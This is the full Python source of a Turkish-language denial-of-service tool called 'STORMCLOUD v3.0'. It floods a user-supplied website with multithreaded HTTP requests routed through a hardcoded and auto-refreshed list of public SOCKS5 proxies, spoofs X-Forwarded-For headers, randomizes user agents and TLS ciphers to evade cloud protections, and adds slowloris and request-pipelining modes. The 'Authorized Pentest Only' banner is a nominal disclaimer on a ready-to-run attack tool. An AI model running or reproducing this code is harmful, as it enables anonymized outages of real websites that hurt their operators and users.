#!/usr/bin/env python3
import os, socket, ssl, random, threading, time, sys, struct, requests
from urllib.parse import urlparse

# Ekranı temizle
os.system('clear' if os.name == 'posix' else 'cls')

print("""
╔═══════════════════════════════════════════════════╗
║             STORMCLOUD v3.0                       ║
║         FULL CLOUD BYPASS ENGINE                  ║
║                                                   ║
║      Yapımcı: TG:@Hunterofevil_6504               ║
║     (Authorized Pentest Only)                     ║
╚═══════════════════════════════════════════════════╝
""")

THREADS = 2000
TIMEOUT = 8

# ===== SENIN YENI SOCKS5 PROXY'LERİN =====
PROXY_LIST = [
    "206.123.156.217:4757",
    "206.123.156.217:10631",
    "206.123.156.230:8982",
    "5.255.123.162:1080",
    "206.123.156.215:4454",
    "5.255.113.177:1080",
    "206.123.156.230:5367",
    "206.123.156.217:6331",
    "206.123.156.236:7321",
    "206.123.156.240:4716",
    "95.81.103.183:1080",
    "206.123.156.230:4106",
    "206.123.156.230:5179",
    "206.123.156.219:14810",
    "107.189.20.61:1080",
    "144.76.159.120:1080",
    "206.123.156.230:4967",
    "206.123.156.242:4851",
    "206.123.156.229:17800",
    "206.123.156.230:5209",
    "206.123.156.219:10605",
    "45.144.49.156:1080",
    "109.71.244.97:1080",
    "206.123.156.219:10178",
    "144.91.111.48:1088",
    "206.123.156.233:5426",
    "206.123.156.230:4748",
    "206.123.156.233:12357",
    "206.123.156.245:4953",
    "91.109.114.211:8888",
    "206.123.156.229:7403",
    "206.123.156.233:9003",
    "82.223.151.29:1080",
    "206.123.156.233:8799",
    "188.127.224.164:2080",
    "206.123.156.233:6799",
    "206.123.156.233:10929",
    "185.128.104.152:8443",
    "206.123.156.233:12214",
    "206.123.156.233:8998",
    "144.76.159.120:1088",
    "206.123.156.228:4492",
    "84.201.144.65:10005",
    "81.90.29.194:10808",
    "91.132.59.221:1080",
    "206.123.156.217:6818",
    "206.123.156.229:4062",
    "193.221.203.192:1080",
    "206.123.156.228:4722",
    "5.45.118.209:1080",
    "89.35.130.48:1080",
    "206.123.156.229:4651",
    "184.95.220.42:1080",
    "167.114.172.208:1088",
    "206.123.156.230:4983",
    "185.135.69.34:80",
    "206.123.156.215:11382",
    "206.123.156.230:5121",
]

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) Chrome/119.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Mobile/15E148",
    "Mozilla/5.0 (Android 14; Mobile) Chrome/120.0.0.0",
]

CIPHERS = [
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'ECDHE-RSA-CHACHA20-POLY1305',
]

istatistik = {"istek": 0, "basarili": 0, "basarisiz": 0}
kilit = threading.Lock()

def socks5_baglan(proxy_host, proxy_port, hedef_host, hedef_port):
    """SOCKS5 bağlantısı - kullanıcı adı/şifre gerektirmez"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((proxy_host, proxy_port))
        
        # SOCKS5 el sıkışması
        # İlk mesaj: [VER=5][NMETHODS=1][METHODS=0 (no auth)]
        s.send(b'\x05\x01\x00')
        resp = s.recv(2)
        
        if resp != b'\x05\x00':
            s.close()
            return None
        
        # Bağlantı isteği: [VER=5][CMD=1 (CONNECT)][RSV=0][ATYP=1 (IPv4)][DST.ADDR][DST.PORT]
        hedef_ip = socket.gethostbyname(hedef_host)
        ip_bytes = socket.inet_aton(hedef_ip)
        
        s.send(b'\x05\x01\x00\x01' + ip_bytes + struct.pack('!H', hedef_port))
        resp = s.recv(10)
        
        if len(resp) >= 2 and resp[1] == 0x00:  # 0x00 = SUCCESS
            return s
        
        s.close()
        return None
    except:
        return None

def proxy_yenile():
    while True:
        try:
            kaynak = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000"
            r = requests.get(kaynak, timeout=10)
            yeni = [s.strip() for s in r.text.strip().split("\n") if ":" in s]
            if yeni:
                with kilit:
                    PROXY_LIST.clear()
                    PROXY_LIST.extend(list(set(yeni)))
                print(f"\n[+] {len(PROXY_LIST)} yeni SOCKS5 proxy yüklendi")
        except:
            pass
        time.sleep(300)

def flood_socks5(hedef_host, hedef_ip, hedef_port, path, ssl_aktif):
    while True:
        try:
            with kilit:
                proxy = random.choice(PROXY_LIST)
            ph, pp = proxy.split(":")
            
            sock = socks5_baglan(ph, int(pp), hedef_host, hedef_port)
            if not sock:
                with kilit:
                    istatistik["basarisiz"] += 1
                continue
            
            if ssl_aktif:
                ctx = ssl.create_default_context()
                ctx.set_ciphers(':'.join(random.sample(CIPHERS, 3)))
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=hedef_host)
            
            xforw = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
            req = f"GET {path} HTTP/1.1\r\nHost: {hedef_host}\r\nUser-Agent: {random.choice(UA_LIST)}\r\nAccept: */*\r\nX-Forwarded-For: {xforw}\r\nX-Real-IP: {xforw}\r\nConnection: close\r\n\r\n"
            
            sock.send(req.encode())
            with kilit:
                istatistik["istek"] += 1
                istatistik["basarili"] += 1
            
            try:
                sock.recv(1024)
            except:
                pass
            sock.close()
        except:
            with kilit:
                istatistik["basarisiz"] += 1

def flood_slowloris(hedef_host, hedef_ip, hedef_port, path, ssl_aktif):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((hedef_ip, hedef_port))
            if ssl_aktif:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=hedef_host)
            sock.send(f"GET {path} HTTP/1.1\r\nHost: {hedef_host}\r\n".encode())
            for _ in range(300):
                sock.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                time.sleep(random.uniform(5, 15))
            sock.close()
        except:
            pass

def flood_pipeline(hedef_host, hedef_ip, hedef_port, path, ssl_aktif):
    while True:
        try:
            with kilit:
                proxy = random.choice(PROXY_LIST)
            ph, pp = proxy.split(":")
            
            sock = socks5_baglan(ph, int(pp), hedef_host, hedef_port)
            if not sock:
                continue
            
            if ssl_aktif:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=hedef_host)
            
            for _ in range(random.randint(15, 30)):
                xforw = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
                req = f"GET {path} HTTP/1.1\r\nHost: {hedef_host}\r\nUser-Agent: {random.choice(UA_LIST)}\r\nX-Forwarded-For: {xforw}\r\nConnection: keep-alive\r\n\r\n"
                try:
                    sock.send(req.encode())
                    with kilit:
                        istatistik["istek"] += 1
                except:
                    break
            
            try:
                sock.recv(4096)
            except:
                pass
            sock.close()
        except:
            pass

def istatistik_goster(baslangic):
    while True:
        time.sleep(5)
        with kilit:
            sure = int(time.time() - baslangic)
            sys.stdout.write(f"\r[+] Süre: {sure}s | İstek: {istatistik['istek']} | Başarılı: {istatistik['basarili']} | Başarısız: {istatistik['basarisiz']} | Proxy: {len(PROXY_LIST)}")
            sys.stdout.flush()

def main():
    print("[?] Hedef site URL'sini girin (örn: https://hedef-site.com):")
    url = input(">>> ").strip()
    
    if not url:
        print("[-] Hata: URL girilmedi!")
        sys.exit(1)
    
    if not url.startswith("http"):
        url = "https://" + url
    
    print(f"\n[?] Thread sayısını girin (Enter = 2000):")
    t_input = input(">>> ").strip()
    t = int(t_input) if t_input.isdigit() else THREADS
    
    print(f"\n[*] Hedef analiz ediliyor...")
    p = urlparse(url)
    host = p.hostname
    port = p.port or (443 if p.scheme == "https" else 80)
    path = p.path or "/"
    
    try:
        hedef_ip = socket.gethostbyname(host)
    except:
        print(f"[-] {host} çözümlenemedi!")
        sys.exit(1)
        
    ssl_aktif = p.scheme == "https"
    
    print(f"\n[+] Hedef: {host} ({hedef_ip}:{port})")
    print(f"[+] SSL: {ssl_aktif}")
    print(f"[+] Proxy (SOCKS5): {len(PROXY_LIST)}")
    print(f"[+] Thread: {t}")
    
    print(f"\n[?] Saldırı başlatılsın mı? (Evet/Hayır):")
    onay = input(">>> ").strip().lower()
    if onay not in ["e", "evet", "yes", "y", ""]:
        print("[-] İptal edildi.")
        sys.exit(0)
    
    threading.Thread(target=proxy_yenile, daemon=True).start()
    
    for i in range(int(t * 0.70)):
        threading.Thread(target=flood_socks5, args=(host, hedef_ip, port, path, ssl_aktif), daemon=True).start()
    
    for i in range(int(t * 0.15)):
        threading.Thread(target=flood_slowloris, args=(host, hedef_ip, port, path, ssl_aktif), daemon=True).start()
    
    for i in range(int(t * 0.15)):
        threading.Thread(target=flood_pipeline, args=(host, hedef_ip, port, path, ssl_aktif), daemon=True).start()
    
    print(f"\n[+] SALDIRI BAŞLADI - Cloud korumaları bypas ediliyor...")
    print(f"[+] {len(PROXY_LIST)} SOCKS5 proxy ile çoklu IP saldırısı")
    print(f"[+] Çıkmak için Ctrl+C\n")
    
    baslangic = time.time()
    threading.Thread(target=istatistik_goster, args=(baslangic,), daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sure = int(time.time() - baslangic)
        print(f"\n\n[+] Bitti. Süre: {sure}s | Toplam istek: {istatistik['istek']}")
        sys.exit(0)

if __name__ == "__main__":
    main()

